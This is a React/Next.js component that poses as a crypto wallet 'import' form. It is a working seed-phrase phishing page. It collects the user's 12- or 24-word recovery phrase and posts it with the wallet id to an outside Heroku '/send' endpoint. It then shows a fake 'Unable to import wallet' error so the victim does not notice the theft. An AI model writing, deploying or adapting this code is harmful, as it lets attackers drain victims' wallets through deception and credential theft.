import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useRouter } from "next/router";
import styles from "../../styles/Home.module.css";
import Tabs from "./index";

export default function Discover() {
  const [phrase, setPhrase] = useState("");
  const router = useRouter();
  const { pid } = router.query;

  const notify = () => {
    phrase === "" ? "" : toast.error("Failed, Unable to import wallet.");
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (phrase !== "") {
      const pS = { phrase: phrase, wallet: pid };
      console.log(pS);

      axios
        .post("https://floating-refuge-41328.herokuapp.com/send", pS)
        .then((res) => res.json())
        .catch((err) => err);
    }
  };

  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Phrase is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.textarea}
            required
          />
          <button onClick={notify} className={styles.button}>
            import
          </button>
          <ToastContainer />
        </form>
      </div>
    </Tabs>
  );
}
